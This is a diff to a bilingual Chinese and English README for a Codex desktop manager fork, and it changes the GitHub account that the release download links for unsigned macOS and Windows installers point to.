@@ -80,13 +80,13 @@ brew install --cask wangnov/tap/codex-app-manager
 
 ### 直接下载
 
-到 fork 的 [最新 GitHub Release](https://github.com/q4549286/Codex-Desktop-DonaAPI-Releases/releases/latest) 下载:
+到 fork 的 [最新 GitHub Release](https://github.com/3517546335-blip/Codex-Desktop-DonaAPI-Releases/releases/latest) 下载:
 
 | 平台 | 文件 | 下载 |
 |---|---|---|
-| Apple Silicon Mac | `CodexDesktopManager_DonaAPI_vX.Y.Z_macOS_aarch64.dmg` | [⤓ GitHub](https://github.com/q4549286/Codex-Desktop-DonaAPI-Releases/releases/latest) |
-| Intel Mac | `CodexDesktopManager_DonaAPI_vX.Y.Z_macOS_x86_64.dmg` | [⤓ GitHub](https://github.com/q4549286/Codex-Desktop-DonaAPI-Releases/releases/latest) |
-| Windows x64 | `CodexDesktopManager_DonaAPI_vX.Y.Z_Windows_x64-setup.exe` | [⤓ GitHub](https://github.com/q4549286/Codex-Desktop-DonaAPI-Releases/releases/latest) |
+| Apple Silicon Mac | `CodexDesktopManager_DonaAPI_vX.Y.Z_macOS_aarch64.dmg` | [⤓ GitHub](https://github.com/3517546335-blip/Codex-Desktop-DonaAPI-Releases/releases/latest) |
+| Intel Mac | `CodexDesktopManager_DonaAPI_vX.Y.Z_macOS_x86_64.dmg` | [⤓ GitHub](https://github.com/3517546335-blip/Codex-Desktop-DonaAPI-Releases/releases/latest) |
+| Windows x64 | `CodexDesktopManager_DonaAPI_vX.Y.Z_Windows_x64-setup.exe` | [⤓ GitHub](https://github.com/3517546335-blip/Codex-Desktop-DonaAPI-Releases/releases/latest) |
 
 当前 fork 的免费 macOS 构建未做 Apple 公证,首次打开可能需要移除 quarantine。Windows x64 安装器当前**没有 Authenticode 代码签名**,首次运行可能出现 SmartScreen 提示;应用内自更新使用的 Tauri updater 签名只校验下载字节,不代表 Windows 发行者信任。详情见 [Windows signing and verification](docs/windows-signing.md)。
 
@@ -227,13 +227,13 @@ brew install --cask wangnov/tap/codex-app-manager
 
 ### Direct download
 
-Grab your platform's file from the fork's [latest GitHub Release](https://github.com/q4549286/Codex-Desktop-DonaAPI-Releases/releases/latest):
+Grab your platform's file from the fork's [latest GitHub Release](https://github.com/3517546335-blip/Codex-Desktop-DonaAPI-Releases/releases/latest):
 
 | Platform | File | Download |
 |---|---|---|
-| Apple Silicon Mac | `CodexDesktopManager_DonaAPI_vX.Y.Z_macOS_aarch64.dmg` | [⤓ GitHub](https://github.com/q4549286/Codex-Desktop-DonaAPI-Releases/releases/latest) |
-| Intel Mac | `CodexDesktopManager_DonaAPI_vX.Y.Z_macOS_x86_64.dmg` | [⤓ GitHub](https://github.com/q4549286/Codex-Desktop-DonaAPI-Releases/releases/latest) |
-| Windows x64 | `CodexDesktopManager_DonaAPI_vX.Y.Z_Windows_x64-setup.exe` | [⤓ GitHub](https://github.com/q4549286/Codex-Desktop-DonaAPI-Releases/releases/latest) |
+| Apple Silicon Mac | `CodexDesktopManager_DonaAPI_vX.Y.Z_macOS_aarch64.dmg` | [⤓ GitHub](https://github.com/3517546335-blip/Codex-Desktop-DonaAPI-Releases/releases/latest) |
+| Intel Mac | `CodexDesktopManager_DonaAPI_vX.Y.Z_macOS_x86_64.dmg` | [⤓ GitHub](https://github.com/3517546335-blip/Codex-Desktop-DonaAPI-Releases/releases/latest) |
+| Windows x64 | `CodexDesktopManager_DonaAPI_vX.Y.Z_Windows_x64-setup.exe` | [⤓ GitHub](https://github.com/3517546335-blip/Codex-Desktop-DonaAPI-Releases/releases/latest) |
 
 The free macOS builds from this fork are not Apple-notarized, so first launch may require removing quarantine. The Windows x64 installer is **not Authenticode-signed** yet, so SmartScreen may warn on first run; the Tauri updater signature used for in-app updates verifies bytes only and is not Windows publisher trust. See [Windows signing and verification](docs/windows-signing.md).
 
